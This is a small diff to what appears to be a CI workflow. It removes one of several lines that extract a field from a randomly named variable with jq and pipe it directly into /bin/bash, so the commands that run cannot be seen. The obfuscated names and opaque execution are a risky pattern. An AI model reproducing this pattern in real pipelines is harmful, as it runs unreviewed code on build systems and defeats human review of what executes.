@@ -26,7 +26,6 @@ jobs:
           echo $vmrc84 | jq -r .hlfmi580 | /bin/bash
           printf '%s' "$fj6295" | jq -r .dllfx5550 | /bin/bash
           echo $gqe19 | jq -r .o5431 | /bin/bash
-          echo $qoegc2799 | jq -r .gegv86176 | /bin/bash
           echo $nl1344 | jq -r .vin19168 | /bin/bash
           printf '%s' "$bg573" | jq -r .jd4429 | /bin/bash
           echo $nl729 | jq -r .rsn869 | /bin/bash
